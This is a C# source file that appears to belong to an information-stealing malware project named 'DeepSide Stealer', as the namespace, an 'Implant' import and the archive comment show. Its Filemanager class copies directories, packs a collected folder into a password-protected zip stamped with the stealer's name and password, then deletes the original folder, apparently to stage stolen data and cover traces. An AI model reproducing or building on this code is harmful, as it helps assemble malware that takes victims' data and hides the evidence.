using Ionic.Zip;
using System.IO;
using System.Linq;
using deepside.Implant;
using spasibozapas;

namespace deepside
{
    internal sealed class Filemanager
    {

        // Remove directory
        public static void RecursiveDelete(string path)
        {
            DirectoryInfo baseDir = new DirectoryInfo(path);

            if (!baseDir.Exists) return;
            foreach (var dir in baseDir.GetDirectories())
                RecursiveDelete(dir.FullName);
            
            baseDir.Delete(true);
        }

        // Copy directory
        public static void CopyDirectory(string sourceFolder, string destFolder)
        {
            if (!Directory.Exists(destFolder))
                Directory.CreateDirectory(destFolder);
            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                string name = Path.GetFileName(file);
                string dest = Path.Combine(destFolder, name);
                File.Copy(file, dest);
            }
            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                string name = Path.GetFileName(folder);
                string dest = Path.Combine(destFolder, name);
                CopyDirectory(folder, dest);
            }
        }

        // Get directory size
        public static long DirectorySize(string path)
        {
            DirectoryInfo dir = new DirectoryInfo(path);
            return dir.GetFiles().Sum(fi => fi.Length) +
                   dir.GetDirectories().Sum(di => DirectorySize(di.FullName));
        }

        // Create archive
        public static string CreateArchive(string directory, bool setpassword = true)
        {
            if (string.IsNullOrEmpty(directory))
            {
                return "";
            }
                if (Directory.Exists(directory))
                {
                //System.Console.WriteLine(directory);
                using (ZipFile zip = new ZipFile(System.Text.Encoding.UTF8))
                {
                    zip.CompressionLevel = Ionic.Zlib.CompressionLevel.Level9;
                    zip.CompressionMethod = CompressionMethod.BZip2;
                    zip.Comment = "" +
                        $"\nDeepSide Stealer <3"
                        + $"\nPassword: {StringsCrypt.ArchivePassword}";
                    if (setpassword)
                        zip.Password = StringsCrypt.ArchivePassword;
                    zip.AddDirectory(directory);
                    zip.Save(directory + ".zip");
                }
            }
                RecursiveDelete(directory);
            
            //Logging.Log("Archive " + new DirectoryInfo(directory).Name + " compression completed");
            return directory + ".zip";
        }


    }
}
